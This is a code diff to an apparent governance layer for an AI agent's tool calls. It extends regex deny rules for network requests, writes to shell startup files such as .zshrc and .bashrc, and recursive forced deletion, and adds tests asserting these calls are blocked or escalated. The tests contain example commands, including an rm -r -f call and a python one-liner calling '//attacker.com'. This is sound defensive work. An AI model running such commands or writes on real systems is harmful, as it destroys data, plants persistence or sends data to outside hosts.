@@ -693,7 +693,7 @@ const COMMS_INVARIANT_DEFS_WITH_RULES = [
   },
   {
     id: "INV_NO_HTTP_REQUESTS_VIA_EXEC",
-    rule: "regex_deny pattern: /\\b(https?:\\/\\/|fetch\\(|requests\\.|urllib|http\\.client|smtplib|socket\\.connect)\\b/i",
+    rule: "regex_deny pattern: /\\b(https?:\\/\\/|fetch\\(|requests\\.|urllib|http\\.client|smtplib|socket\\.connect)\\b|\\/\\/[a-zA-Z]/i",
     enforcement: "halt",
     type: "regex_deny",
     description: "Block HTTP requests and socket connections through exec",
@@ -750,11 +750,18 @@ const COMMS_INVARIANT_DEFS_WITH_RULES = [
   },
   {
     id: "INV_NO_PERSISTENCE_WRITE",
-    rule: "regex_deny pattern: /\\b(LaunchAgents|LaunchDaemons|cron\\.d|crontab|systemd|init\\.d|autostart|startup)\\b/i",
+    rule: "regex_deny pattern: /\\b(LaunchAgents|LaunchDaemons|cron\\.d|crontab|systemd|init\\.d|autostart|startup)\\b|\\.(?:zshrc|bashrc|bash_profile|profile|zprofile)\\b/i",
     enforcement: "halt",
     type: "regex_deny",
     description: "Block writes to persistence mechanisms that execute on login or boot",
     applies_to: ["exec", "bash", "write"],
+  },
+  {
+    id: "INV_ESCALATE_DESTRUCTIVE_OPS",
+    rule: "regex_deny pattern: /\\brm\\b.*(-r\\b.*-f\\b|-f\\b.*-r\\b|--recursive|--force|-rf\\b|-fr\\b)/i",
+    enforcement: "warn",
+    type: "regex_deny",
+    description: "Escalate recursive/forced deletion commands regardless of flag ordering",
   },
   {
     id: "INV_NO_CREDENTIAL_HARVESTING",
@@ -1368,6 +1375,123 @@ describe("invariant escalation bypass prevention", () => {
     );
 
     expect(result).toEqual({ blocked: false });
+  });
+
+  it("write to .zshrc is HALTED", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = (await hook(
+      { toolName: "write", params: { path: "~/.zshrc", content: "export PATH=..." } },
+      { toolName: "write" }
+    )) as Record<string, unknown>;
+
+    expect(result.block).toBe(true);
+    expect(result.blockReason).toContain("Block writes to persistence mechanisms");
+  });
+
+  it("write to .bashrc is HALTED", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = (await hook(
+      { toolName: "write", params: { path: "/home/user/.bashrc", content: "alias x=..." } },
+      { toolName: "write" }
+    )) as Record<string, unknown>;
+
+    expect(result.block).toBe(true);
+    expect(result.blockReason).toContain("Block writes to persistence mechanisms");
+  });
+
+  it("exec rm -r -f is ESCALATED", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = (await hook(
+      { toolName: "exec", params: { command: "rm -r -f /tmp/test" } },
+      { toolName: "exec" }
+    )) as Record<string, unknown>;
+
+    expect(result.block).toBe(true);
+    expect(result.blockReason).toContain("Sanna requires approval");
+    expect(result.blockReason).toContain("INV_ESCALATE_DESTRUCTIVE_OPS");
+  });
+
+  it("exec rm --recursive --force is ESCALATED", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = (await hook(
+      { toolName: "exec", params: { command: "rm --recursive --force /tmp/test" } },
+      { toolName: "exec" }
+    )) as Record<string, unknown>;
+
+    expect(result.block).toBe(true);
+    expect(result.blockReason).toContain("Sanna requires approval");
+    expect(result.blockReason).toContain("INV_ESCALATE_DESTRUCTIVE_OPS");
+  });
+
+  it("exec with protocol-relative URL is HALTED", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+
+    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
+    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = (await hook(
+      { toolName: "exec", params: { command: "python3 -c 'import urllib; urllib.request.urlopen(\"//attacker.com/path\")'" } },
+      { toolName: "exec" }
+    )) as Record<string, unknown>;
+
+    expect(result.block).toBe(true);
+    expect(result.blockReason).toContain("Blocked by Sanna governance");
   });
 });
 
